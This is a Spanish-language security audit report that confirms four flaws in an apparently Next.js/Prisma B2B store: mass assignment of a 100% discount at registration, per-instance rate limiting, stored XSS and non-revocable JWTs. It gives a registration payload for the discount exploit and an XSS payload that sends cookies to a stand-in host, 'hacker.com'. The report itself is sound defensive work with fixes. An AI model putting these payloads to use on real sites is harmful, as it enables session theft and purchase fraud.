# Validación Técnica del Informe de Seguridad

**Auditor:** Senior Security Engineer & Code Reviewer
**Objetivo:** Validación basada en código (sin suposiciones) de los hallazgos previos.

---

## Hallazgo 1: Mass Assignment (defaultDiscount)
**Estado:** Confirmado
**Confianza:** Alta

### 1. Evidencia
- **Archivo:** `src/app/api/auth/register/route.ts`
- **Líneas:** 55-59 (Definición Zod) y 153 (Creación Prisma)

```typescript
// Líneas 55-59: El validador Zod expone el campo y permite entre 0 y 100
defaultDiscount: z
  .number()
  .min(0)
  .max(100, "El descuento no puede superar el 100%")
  .default(0),

// Línea 146: Inicia la creación
const company = await tx.company.create({
  data: {
    rut: data.rut,
    razonSocial: data.razonSocial,
    // ...
    defaultDiscount: data.defaultDiscount, // <--- Aquí se guarda directo en DB
```

### 2. Flujo Completo
1. **HTTP POST Request** a `/api/auth/register` con payload: `{"razonSocial":"...","rut":"...","email":"...","password":"...", "defaultDiscount": 100}`
2. **Zod Validator** (`RegisterSchema.parse`): Procesa el request. Al incluir `"defaultDiscount": 100`, pasa la validación porque cumple con `min(0)` y `max(100)`.
3. **Prisma Create**: `tx.company.create` toma `data.defaultDiscount` (que ahora es 100) y lo inserta en la base de datos PostgreSQL de Neon.
4. **Respuesta**: El usuario obtiene su cuenta. De ahí en adelante, el motor de precios (`price.service.ts`) le restará un 100% a todas sus compras corporativas.

### 3. Explotabilidad
**Totalmente explotable.** La ruta es pública (registro). Cualquier persona puede ejecutar el ataque simplemente modificando el body de la petición HTTP interceptada o generada desde cURL/Postman. No existe mitigación.

---

## Hallazgo 2: Ineffective Rate Limiting (Serverless)
**Estado:** Riesgo de Diseño / Vulnerabilidad Confirmada
**Confianza:** Alta

### 1. Evidencia
- **Archivo:** `src/proxy.ts`
- **Línea:** 6

```typescript
// Rate limit en memoria (Edge-compatible, estado por worker)
const rateLimitMap = new Map<string, { count: number, resetAt: number }>();
```

### 2. Flujo Completo
1. **Atacante (Botnet)** lanza 10,000 peticiones POST a `/api/auth/login`.
2. **Vercel Infrastructure**: Al detectar tráfico alto, Vercel provisiona 50 a 100 instancias de "Edge Functions" (o Node.js Serverless Isolates) simultáneas.
3. **Middleware (`proxy.ts`)**: Cada instancia Serverless inicializa su propia variable global aislada `const rateLimitMap = new Map()`.
4. **Validación**: Cada instancia lleva su propia cuenta. Un atacante nunca alcanza las 1,000 peticiones en *un solo nodo*, logrando evadir la limitación global de 1000/15min.

### 3. Explotabilidad
**Explotable.** Por la arquitectura efímera de Vercel (Cold Starts) y el auto-escalado, una estructura local `Map()` en memoria de Node no puede mantener un estado distribuido, permitiendo ataques de Credential Stuffing en producción.
**Solución:** Reemplazar por `@upstash/ratelimit` usando un motor Redis persistente centralizado.

---

## Hallazgo 3: Stored XSS en Descripciones
**Estado:** Confirmado (con pre-condición)
**Confianza:** Alta

### 1. Evidencia
- **Archivo:** `src/app/products/[slug]/page.tsx`
- **Línea:** 348

```tsx
<div
  className="..."
  dangerouslySetInnerHTML={{
    __html: (
      product.description || "No hay descripción disponible."
    )
      .replace(/\\n/g, "<br />")
      .replace(/\n/g, "<br />"),
  }}
/>
```

### 2. Flujo Completo
1. **Administrador comprometido** (o empleado malicioso) envía un PATCH a `/api/products/[id]` con una descripción: `<img src=x onerror="fetch('https://hacker.com/?c=' + document.cookie)">`.
2. **Prisma Update**: Guarda el string en la tabla `Product`.
3. **Víctima (Comprador)**: Visita `/products/tu-producto`.
4. **React Render**: Ejecuta `dangerouslySetInnerHTML` inyectando el string exacto en el DOM.
5. **Ejecución (XSS)**: El navegador procesa la etiqueta `<img>` rota y ejecuta el JS dentro de `onerror`.

### 3. Explotabilidad
**Explotable, pero mitigado por roles.** Solo los roles `ADMIN` tienen permiso para modificar productos (ruta `POST /api/products` validada con `requireRole(user, [UserRole.ADMIN])`). Por lo tanto, requiere que el atacante ya tenga nivel de administrador (Insider Threat o cuenta vulnerada). No es explotable por usuarios regulares. 
**Recomendación:** Agregar `dompurify` para sanitizar antes de renderizar (Defensa en profundidad).

---

## Hallazgo 4: Falta de Revocación de Tokens JWT
**Estado:** Riesgo de Diseño / Mejora Recomendada
**Confianza:** Alta

### 1. Evidencia
- **Archivo:** `src/lib/auth.ts` y `src/proxy.ts`
- **Línea:** 43 (auth.ts)

```typescript
export function verifyToken(token: string): TokenPayload {
  try {
    return jwt.verify(token, JWT_SECRET) as TokenPayload; // Validación estrictamente matemática
  } //...
```

### 2. Flujo Completo
1. **Login**: Devuelve JWT (Access 1h) en memoria, y Refresh Token (1d) en cookie HttpOnly.
2. **Revocación**: El Super Admin despide a un empleado (Sales Rep) y borra su cuenta en la base de datos o lo desactiva.
3. **Acceso Posterior**: El JWT del ex-empleado sigue vigente matemáticamente. Como `jwt.verify` y el Middleware `proxy.ts` no validan la BD, el ex-empleado puede seguir haciendo requests autorizados hasta que la hora expire.

### 3. Explotabilidad
No es una vulnerabilidad explotable externamente (no permite romper el sistema a un tercero). Es el diseño estándar del "Stateless JWT". Sin embargo, es un riesgo arquitectónico en un entorno B2B.
**Recomendación:** Crear una Blocklist de JWTs revocados en Redis o reducir la expiración del `accessToken` a 5 minutos.

---

## Búsqueda de Falsos Negativos (Auditoría Secundaria Ciega)
Tras revisar los servicios clave, se buscaron vulnerabilidades extra:

- **Lógica B2B Segura (Falso Negativo descartado):** Revisé `src/modules/orders/domain/order.service.ts` para buscar IDOR al modificar órdenes. Está mitigado porque la ruta `/api/orders` comprueba `data.companyId !== user.companyId` antes de delegar la creación o lectura al servicio.
- **SQL Injection (Falso Negativo descartado):** Búsqueda de `$queryRaw` o uso inseguro de interpolación SQL. Prisma Client se usa 100% como ORM estructurado (findMany, create, update), lo cual mitiga Inyecciones SQL.

---

## 📊 Tabla de Resultados (Validación Técnica)

| Hallazgo | Estado | Severidad | Evidencia | Confianza |
| :--- | :--- | :--- | :--- | :--- |
| **Mass Assignment** (defaultDiscount en Registro B2B) | Confirmado | Crítica | `api/auth/register/route.ts` Línea 55 | Alta |
| **In-Memory Rate Limit** (Bypass en Edge/Serverless) | Riesgo de Diseño | Alta | `proxy.ts` Línea 6 | Alta |
| **Stored XSS** en Productos | Confirmado | Media | `[slug]/page.tsx` Línea 348 | Alta (Requiere Admin) |
| **JWT Stateless** (Falta de Revocación) | Mejora Recomendada | Baja | `lib/auth.ts` Línea 43 | Alta |
